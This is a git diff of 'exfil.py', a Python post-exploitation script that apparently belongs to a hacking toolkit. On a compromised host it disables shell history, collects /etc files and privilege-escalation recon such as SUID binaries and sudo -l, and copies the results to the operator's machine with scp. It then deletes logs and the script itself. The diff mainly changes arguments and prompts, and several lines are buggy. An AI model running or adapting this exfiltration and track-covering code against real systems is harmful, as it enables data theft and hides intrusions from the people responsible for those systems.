@@ -1,11 +1,15 @@
-#!/usr/env/python3
+#!/usr/bin/python3
 # author: suffs811 
-# github: https://github.com/cysec11/scripts.git
+# Copyright (c) 2023 suffs811
+# https://github.com/suffs811/the-terminator.git
+# read the README.md file for more details; software distributed under MIT license
+#
 # python script for catting /etc files, saving them to file,
 # sending them to local system,
 # and deleting history/script from target machine.
 # 
-# usage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'
+# usage: python3 exfil.py -i <your_ip:/path_to_save_file> -u '<your_username>'
+
 
 import os
 import platform
@@ -13,22 +17,28 @@ import argparse
 
 
 # get arguments for IP and password
-parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'")
+parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i <local_ip:/local_path> -u '<your_username>'")
 parser.add_argument("-i", "--ip", help="specify 'local IP:/path' to scp (secure copy) data file to", required="True")
-parser.add_argument("-p", "--password", help="specify user password if know")
+parser.add_argument("-u", "--username", help="specify local (your) username for scp", required="True")
 args = parser.parse_args()
 local_path = args.ip 
-password = args.password
+username = args.username
 
 
-def extract_clear(local_path):
+# check if user password known fo sudo -l cmd
+def user_pass():
+    print("#############################################")
+    bool_pass = input("+++ do you know the user's password? (y/n): ")
+    return bool_pass
+
+
+def extract_clear(local_path,username):
     # confirm user wants to permanently delete logs and alter bach environment variables
-    print("this script will permanently delete logs and alter bash envs...")
-    print("do you want to gather system data and export it to local machine?")
-    answer = input("(yes/no): ")
+    print("\n### this script will permanently delete logs and alter bash environment variables... ###")
+    answer = input("\n+++ are you sure you want to gather system data and export it to local machine? (yes/no): ")
 
     if answer == "no":
-        return
+        exit()
     elif answer == "yes":
         # disable history logging
         print("\ndisabling history logging...")
@@ -39,7 +49,7 @@ def extract_clear(local_path):
         os.system("set +o history")
 
         # create file to write data to
-        os.system("/tmp/data_exfil.txt")
+        os.system("touch /tmp/data_exfil.txt")
 
         # write data to file
         print("### exfiltrating data... ###")
@@ -87,30 +97,34 @@ def extract_clear(local_path):
         os.system("find / type -f perm /4000 2>/dev/null")
 
         # exfil the data file to local machine
-        print("\n### sending data to root@{}... ###\n+input your local machine root password+".format(local_path))
-        os.system("scp /tmp/data_exfil.txt root@{}".format(local_path))
-        print("\n*** data_exfil.txt sent to {} ***".format(local_path))
+        print("\n### sending data to {}@{}... ###\n+input your local machine user's password+".format(username,local_path))
+        os.system("timeout -k 10 10 scp /tmp/data_exfil.txt {}@{}".format(username,local_path))
+        print("\n### data_exfil.txt sent to {} ###".format(local_path))
         return
     else:
-        print("didn't write yes or no!!!")
+        print("\n*** didn't enter 'y' or 'n'!!! ***")
         extract_clear()
 
 
 # detect if pwd was given as option, if so, run sudo -l
-def sudo_l():
-    if args.password:
-        print("\n### attempting sudo -l: ###")
+def sudo_l(bool_pass):
+
+    if bool_pass == "y":
+        print("\n### enter user's password to run sudo-l (you have 10 seconds): ###")
         # trouble finding a way to run sudo -l bc it requires password input
-        os.system("timeout -k 5 5 sudo -l -S {}".format(password))
+        os.system("timeout -k 10 10 sudo -l")
         #os.system("sudo -S -l < <(echo '{}')".format(password))
+    elif bool_pass == "n":
+        print("\n### skipping sudo -l, user's password not known... ###")
     else:
-        print("\n*** no password was specified, could not run 'sudo -l' ***")
+        print("\n*** didn't enter 'y' or 'n'!!! ***")
+        user_pass()
+
 
 
 # ask to clear logs and delete script from local machine
 def delete_file():
-    print("\ndo you want to delete the logs and this script?")
-    answer_2 = input("(yes/no): ")
+    answer_2 = input("\n+++ do you want to delete the logs and this script? (yes/no): ")
     if answer_2 == "no":
         print("good luck!")
         return
@@ -135,6 +149,7 @@ def delete_file():
         delete_file()
 
 # call functions
-extract_clear(local_path)
-sudo_l()
+user_pass ()
+extract_clear(local_path,username)
+sudo_l(bool_pass)
 delete_file()
